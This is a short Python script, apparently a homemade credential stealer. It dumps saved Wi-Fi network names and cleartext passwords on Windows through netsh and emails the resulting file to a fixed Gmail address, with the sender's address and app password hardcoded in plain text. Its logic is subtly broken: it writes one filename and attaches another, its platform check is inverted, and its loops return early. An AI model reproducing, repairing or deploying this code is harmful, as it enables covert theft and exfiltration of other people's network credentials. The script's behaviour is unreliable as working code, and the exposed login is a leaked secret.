from email.mime.base import MIMEBase
from email import encoders
from email.mime.multipart import MIMEMultipart
import smtplib, ssl, sys
import subprocess as sp

msg = MIMEMultipart()

def Get_Wifi_Password():
    get_wifi = sp.check_output(
        ['netsh', 'wlan', 'show', 'profiles'], encoding='cp860'
    )
    for network in get_wifi.split('\n'):
        if 'Todos os Perfis de Usuário' in network:
            two_point = network.find(':')
            info_network = network[two_point+2:]
            all_networks = sp.check_output(
                ['netsh', 'wlan', 'show', 'profiles', info_network, 'key', '=', 'clear'], encoding='cp860'
                )
            for passwords in all_networks.split('\n'):
                if 'Nome SSID' in passwords:
                    names = passwords[two_point+2:]
                else:
                    return 'Name SSID not found!'
                
                if 'Conteúdo da Chave' in passwords:
                    passwd = passwords[two_point+2:]
                    get_network = f'Network: {names}\nSenha: {passwd}\n\n'
                    with open('passwords.txt', 'a') as wifi:
                        wifi.write(f'{get_network}')
                    wifi.close()
                else:
                    return 'Content Key not found!'
        else:
            return 'Name list not found!'

def Send_Email():
    ADDR = 'xablau.mpx@gmail.com'
    msg = MIMEMultipart()
    msg['Subject'] = 'Hacking'
    msg['From'] = ADDR
    msg['To'] = 'vinibruno99@gmail.com'
    try:
        file = open('senhas.txt', 'rb')
        att = MIMEBase('application', 'octet-stream')
        att.set_payload(file.read())
        encoders.encode_base64(att)
        att.add_header(
            'Content-Disposition', 'attachment; filename=senhas.txt'
        )
        file.close()
        msg.attach(att)

    except Exception as error:
        return error
    
    context = ssl.create_default_context()
    with smtplib.SMTP(host='smtp.gmail.com', port=587) as smtp:
        try:
            smtp.starttls(context=context)
            smtp.login(msg['From'], 'vrrqjavicmysbflk')
            smtp.sendmail(msg['From'], msg['To'], msg.as_string())
            return 'Email Send Sucess'
        
        except Exception as err:
            return err
        
if __name__ == '__main__':
    if not sys.platform == 'win32':
        Get_Wifi_Password()
        Send_Email()
    else:
        print('System Not Compatible')
